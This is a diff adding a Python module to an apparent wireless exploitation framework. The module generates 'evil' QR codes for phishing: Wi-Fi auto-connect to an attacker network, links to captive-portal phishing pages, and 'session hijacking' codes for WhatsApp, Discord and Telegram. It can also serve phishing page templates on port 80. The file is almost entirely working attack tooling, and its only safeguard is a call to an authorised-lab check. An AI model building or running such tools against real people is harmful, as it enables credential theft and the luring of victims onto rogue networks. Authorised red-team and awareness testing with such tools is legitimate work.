@@ -1,0 +1,149 @@
+#!/usr/bin/env python3
+# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
+"""Evil QR code phishing attack module.
+
+Generates QR codes that redirect to captive portal phishing pages when
+scanned. Targets WhatsApp Web, Discord, social logins, and custom URLs.
+Inspired by wifipumpkin3's EvilQR3 module.
+
+Modes:
+  - wifi_qr         QR code with embedded Wi-Fi credentials (auto-connect)
+  - portal_qr       QR code linking to captive portal phishing page
+  - session_qr      QR code for session hijacking (WhatsApp/Discord/Telegram)
+  - custom_qr       QR code with arbitrary URL
+
+Version: 1.0.0
+"""
+
+from __future__ import annotations
+
+import http.server
+import json
+import logging
+import threading
+from pathlib import Path
+from typing import Optional
+
+from wirelessxpl.core.exploit import *
+
+from wirelessxpl.modules.generic.wifi_lab._disclaimer import require_authorised_lab
+
+logger = logging.getLogger(__name__)
+
+
+class Exploit(Exploit):
+    """Evil QR code phishing with multiple strategies."""
+
+    __info__ = {
+        "name": "Evil QR Attack",
+        "description": (
+            "Generate malicious QR codes for phishing: Wi-Fi auto-connect, "
+            "captive portal redirect, session hijacking (WhatsApp/Discord), "
+            "and custom URLs. Inspired by wifipumpkin3's EvilQR3."
+        ),
+        "authors": ("André Henrique (@mrhenrike) | União Geek",),
+        "references": (
+            "https://github.com/P0cL4bs/wifipumpkin3",
+        ),
+        "devices": ("wifi",),
+    }
+
+    mode = OptString("portal_qr", "Mode: wifi_qr | portal_qr | session_qr | custom_qr")
+    ssid = OptString("FreeWiFi", "SSID for wifi_qr (auto-connect)")
+    password = OptString("", "Password for wifi_qr (blank = open)")
+    encryption = OptString("nopass", "Encryption for wifi_qr: WPA | WEP | nopass")
+    portal_url = OptString("http://10.0.0.1/", "URL for portal_qr / custom_qr")
+    target_service = OptString("whatsapp", "Service for session_qr: whatsapp | discord | telegram")
+    output_file = OptString(".tmp/evil_qr.png", "Output QR code image path")
+    serve_portal = OptBool(True, "Also serve captive portal alongside QR")
+    portal_template = OptString("oauth_social", "Portal template for serve_portal")
+    portal_port = OptInteger(80, "Portal HTTP port")
+    dry_run = OptBool(False, "Print QR data without generating")
+
+    def _generate_wifi_qr_string(self) -> str:
+        """Generate Wi-Fi config QR string (standard format)."""
+        enc = self.encryption.upper()
+        if enc not in ("WPA", "WEP", "nopass"):
+            enc = "nopass"
+        hidden = "false"
+        return "WIFI:T:{};S:{};P:{};H:{};;".format(enc, self.ssid, self.password, hidden)
+
+    def _generate_qr(self, data: str) -> Optional[str]:
+        """Generate QR code image using qrcode library."""
+        try:
+            import qrcode
+        except ImportError:
+            print_error("qrcode library not found. Install: pip install qrcode[pil]")
+            return None
+
+        output = Path(self.output_file)
+        output.parent.mkdir(parents=True, exist_ok=True)
+
+        qr = qrcode.QRCode(version=1, box_size=10, border=4)
+        qr.add_data(data)
+        qr.make(fit=True)
+        img = qr.make_image(fill_color="black", back_color="white")
+        img.save(str(output))
+        return str(output)
+
+    def _generate_ascii_qr(self, data: str) -> None:
+        """Print QR code as ASCII art in terminal."""
+        try:
+            import qrcode
+            qr = qrcode.QRCode(version=1, box_size=1, border=1)
+            qr.add_data(data)
+            qr.make(fit=True)
+            qr.print_ascii(invert=True)
+        except ImportError:
+            print_info("QR data: {}".format(data))
+
+    def run(self) -> None:
+        """Generate evil QR code."""
+        valid_modes = ("wifi_qr", "portal_qr", "session_qr", "custom_qr")
+        if self.mode not in valid_modes:
+            print_error("Invalid mode '{}'. Choose: {}".format(self.mode, ", ".join(valid_modes)))
+            return
+
+        require_authorised_lab()
+
+        if self.mode == "wifi_qr":
+            data = self._generate_wifi_qr_string()
+            print_info("Wi-Fi QR: SSID='{}' Enc='{}'".format(self.ssid, self.encryption))
+        elif self.mode == "portal_qr":
+            data = self.portal_url
+            print_info("Portal QR → {}".format(data))
+        elif self.mode == "session_qr":
+            service_urls = {
+                "whatsapp": "https://web.whatsapp.com/",
+                "discord": "https://discord.com/login",
+                "telegram": "https://web.telegram.org/",
+            }
+            data = service_urls.get(self.target_service, self.portal_url)
+            print_info("Session QR ({}): {}".format(self.target_service, data))
+        else:
+            data = self.portal_url
+
+        if self.dry_run:
+            print_info("DRY RUN — QR data: {}".format(data))
+            self._generate_ascii_qr(data)
+            return
+
+        print_status("Generating QR code...")
+        result = self._generate_qr(data)
+        if result:
+            print_success("QR code saved: {}".format(result))
+        self._generate_ascii_qr(data)
+
+        if self.serve_portal and self.mode in ("portal_qr", "session_qr"):
+            print_info("Serving captive portal on port {}...".format(self.portal_port))
+            resources = Path(__file__).resolve().parents[3] / "resources" / "phishing_pages"
+            tpl = resources / self.portal_template
+            if tpl.is_dir():
+                handler = type("QRHandler", (http.server.SimpleHTTPRequestHandler,),
+                               {"directory": str(tpl)})
+                server = http.server.HTTPServer(("0.0.0.0", self.portal_port), handler)
+                try:
+                    server.serve_forever()
+                except KeyboardInterrupt:
+                    server.shutdown()
+                    print_info("\nPortal stopped.")
